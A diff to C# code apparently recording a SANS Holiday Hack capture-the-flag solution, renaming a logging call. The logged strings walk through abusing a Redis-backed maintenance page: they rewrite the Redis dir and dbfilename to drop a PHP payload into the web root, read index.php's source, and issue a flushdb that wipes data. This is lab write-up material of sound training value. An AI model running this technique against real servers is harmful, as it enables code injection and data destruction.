@@ -73,7 +73,7 @@ namespace Janda.CTF.SANS.HolidayHack
                 ?>
                 example1The site is in maintenance modexample2#We think there's a bug in index.php���'i hplayer@58394353a03f:~$ 
 
-            ".LogNote(_logger, "Run following commands: \n{1}\n{2}\n{3}\n{4}\n{5}\n",
+            ".Log(_logger, "Run following commands: \n{1}\n{2}\n{3}\n{4}\n{5}\n",
                 "curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html",
                 "curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php",
                 "curl http://localhost/maintenance.php?cmd=set,test,\"%3C%3Fphp+readfile('index.php')+%3F%3E\"",
@@ -96,26 +96,26 @@ namespace Janda.CTF.SANS.HolidayHack
                 We're pretty sure the bug is in the index page. Can you somehow use the
                 maintenance page to view the source code for the index page?
 
-            ".LogNote(_logger, "player@bef087130d45:~$");
+            ".Log(_logger, "player@bef087130d45:~$");
 
 
             @"
                 Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on
-            ".LogNote(_logger, "curl http://localhost");
+            ".Log(_logger, "curl http://localhost");
 
 
             @"
                 Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dir' '/var/www/html'
 
                 OK
-            ".LogNote(_logger, "curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html");
+            ".Log(_logger, "curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html");
 
 
             @"
                 Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'some.php'
 
                 OK
-            ".LogNote(_logger, "curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php");
+            ".Log(_logger, "curl http://localhost/maintenance.php?cmd=config,set,dbfilename,some.php");
 
 
 
@@ -123,14 +123,14 @@ namespace Janda.CTF.SANS.HolidayHack
                 Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php show_source('\''index.php'\'') ?>'
 
                 OK
-            ".LogNote(_logger, @"curl http://localhost/maintenance.php?cmd=set,test,""%3C%3Fphp+show_source('index.php')+%3F%3E""");
+            ".Log(_logger, @"curl http://localhost/maintenance.php?cmd=set,test,""%3C%3Fphp+show_source('index.php')+%3F%3E""");
 
 
             @"
                 Running: redis-cli --raw -a '<password censored>' 'save'
 
                 OK
-            ".LogNote(_logger, @"curl http://localhost/maintenance.php?cmd=save");
+            ".Log(_logger, @"curl http://localhost/maintenance.php?cmd=save");
 
 
 
@@ -154,7 +154,7 @@ namespace Janda.CTF.SANS.HolidayHack
                 Warning: Binary output can mess up your terminal. Use ""--output -"" to tell 
                 Warning: curl to output it to your terminal anyway, or consider ""--output 
                 Warning: <FILE>"" to save to a file.
-            ".LogNote(_logger, "player@4389dbda2fc2:~$ curl http://localhost/some.php");
+            ".Log(_logger, "player@4389dbda2fc2:~$ curl http://localhost/some.php");
 
 
 
@@ -167,7 +167,7 @@ namespace Janda.CTF.SANS.HolidayHack
                 </span>
                 </codeexample1The site is in maintenance mode�߹�(�56]
 
-            ".LogNote(_logger, "player@4389dbda2fc2:~$ curl http://localhost/some.php --output -");
+            ".Log(_logger, "player@4389dbda2fc2:~$ curl http://localhost/some.php --output -");
 
 
 
@@ -216,7 +216,7 @@ namespace Janda.CTF.SANS.HolidayHack
                 echo ""Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on""
                 ?>
 
-            ".LogNote(_logger, "index.php {html}", @"<code><span style=\""color: #000000\""><span style=\""color: #0000BB\"">&lt;?php<br /><br /></span><span style=\""color: #FF8000\"">#&nbsp;We&nbsp;found&nbsp;the&nbsp;bug!!<br />#<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;/<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.\-/.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/\&nbsp;()&nbsp;&nbsp;&nbsp;()<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/~---~\.-~^-.<br />#&nbsp;.-~^-./&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;\---.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;.-~\&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;/~-.<br />#&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;A&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;\/<br />#&nbsp;#####hhc:{\""hash\"":&nbsp;\""dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b\"",&nbsp;\""resourceId\"":&nbsp;\""7246f9a7-3cf1-4471-b663-f4e8391b0208\""}#####<br /><br /></span><span style=\""color: #007700\"">echo&nbsp;</span><span style=\""color: #DD0000\"">\""Something&nbsp;is&nbsp;wrong&nbsp;with&nbsp;this&nbsp;page!&nbsp;Please&nbsp;use&nbsp;http://localhost/maintenance.php&nbsp;to&nbsp;see&nbsp;if&nbsp;you&nbsp;can&nbsp;figure&nbsp;out&nbsp;what's&nbsp;going&nbsp;on\""<br /></span><span style=\""color: #0000BB\"">?&gt;<br /></span></span></code>\");
+            ".Log(_logger, "index.php {html}", @"<code><span style=\""color: #000000\""><span style=\""color: #0000BB\"">&lt;?php<br /><br /></span><span style=\""color: #FF8000\"">#&nbsp;We&nbsp;found&nbsp;the&nbsp;bug!!<br />#<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;&nbsp;/<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.\-/.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/\&nbsp;()&nbsp;&nbsp;&nbsp;()<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/~---~\.-~^-.<br />#&nbsp;.-~^-./&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;\---.<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;.-~\&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;/~-.<br />#&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\&nbsp;&nbsp;A&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;\<br />#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\/&nbsp;\/<br />#&nbsp;#####hhc:{\""hash\"":&nbsp;\""dfd550b4b1bc136d9480bc570f7ec2382f5bd23cf9e227770582c15118e5bc8b\"",&nbsp;\""resourceId\"":&nbsp;\""7246f9a7-3cf1-4471-b663-f4e8391b0208\""}#####<br /><br /></span><span style=\""color: #007700\"">echo&nbsp;</span><span style=\""color: #DD0000\"">\""Something&nbsp;is&nbsp;wrong&nbsp;with&nbsp;this&nbsp;page!&nbsp;Please&nbsp;use&nbsp;http://localhost/maintenance.php&nbsp;to&nbsp;see&nbsp;if&nbsp;you&nbsp;can&nbsp;figure&nbsp;out&nbsp;what's&nbsp;going&nbsp;on\""<br /></span><span style=\""color: #0000BB\"">?&gt;<br /></span></span></code>\");
         }
 
 
@@ -233,7 +233,7 @@ namespace Janda.CTF.SANS.HolidayHack
                 <hr>
                 <address>Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80</address>
                 </body></html>
-            ".LogNote(_logger, "player@255adc1ca1b3:~$ curl http://localhost/maintenance.php?cmd=\"select 1\"");
+            ".Log(_logger, "player@255adc1ca1b3:~$ curl http://localhost/maintenance.php?cmd=\"select 1\"");
         }
 
 
@@ -458,7 +458,7 @@ namespace Janda.CTF.SANS.HolidayHack
                 127.0.0.1
 
                 
-                ".LogNote(_logger, "player@5ad9ff7da6fd:~$ curl {command}", "http://localhost/maintenance.php?cmd=config,get,*");
+                ".Log(_logger, "player@5ad9ff7da6fd:~$ curl {command}", "http://localhost/maintenance.php?cmd=config,get,*");
 
         }
 
@@ -607,7 +607,7 @@ namespace Janda.CTF.SANS.HolidayHack
 
                 # Keyspace
                 db0:keys=2,expires=0,avg_ttl=0
-            ".LogNote(_logger, "curl {command}", "http://localhost/maintenance.php?cmd=info");
+            ".Log(_logger, "curl {command}", "http://localhost/maintenance.php?cmd=info");
 
         }
 
@@ -618,7 +618,7 @@ namespace Janda.CTF.SANS.HolidayHack
 
                 OK
                 player@255adc1ca1b3:~$ 
-            ".LogNote(_logger, "player@255adc1ca1b3:~$ curl http://localhost/maintenance.php?cmd=flushdb");
+            ".Log(_logger, "player@255adc1ca1b3:~$ curl http://localhost/maintenance.php?cmd=flushdb");
 
         }
     }
